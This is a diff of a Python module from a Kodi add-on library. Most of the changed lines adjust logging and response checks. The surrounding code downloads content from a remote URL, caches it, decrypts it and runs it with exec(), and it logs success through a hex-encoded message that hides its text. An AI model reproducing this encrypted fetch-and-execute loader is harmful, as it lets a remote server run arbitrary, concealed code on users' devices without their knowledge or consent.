@@ -137,7 +137,7 @@ koding.dolog(string='Quick test to see if this gets printed to the log', my_debu
     global DEBUG
     global ADDON_ID
     if DEBUG == 'true' or my_debug:
-        xbmc.log(ADDON_ID+': '+string, 2)
+        xbmc.log('### %s : %s'%(ADDON_ID,string), 2)
 #----------------------------------------------------------------
 def Check_Addons(addons):
     """ internal command ~"""
@@ -315,7 +315,7 @@ koding.Main('http://noobsandnerds.com?id=test', post_type='get')~"""
             runcode_date = time.strftime('%Y%m%d%H%M%S', runcode_date)
         if int(runcode_date)+1000000 < int(Timestamp()):
             run_code = Open_URL(url, post_type)
-            if not run_code.startswith('This url could not be opened'):
+            if run_code:
                 writefile = open(RUNCODE, 'w')
                 writefile.write(run_code)
                 writefile.close()
@@ -327,7 +327,7 @@ koding.Main('http://noobsandnerds.com?id=test', post_type='get')~"""
     else:
         run_code = Open_URL(url, post_type)
 
-    if not run_code.startswith('This url could not be opened'):
+    if run_code:
         try:
             exec(Encryption(message=run_code.replace('\n','').replace('\t','').replace('\r','')))
             dolog(converthex('232323205375636365737366756c6c792072756e20636f6465'))
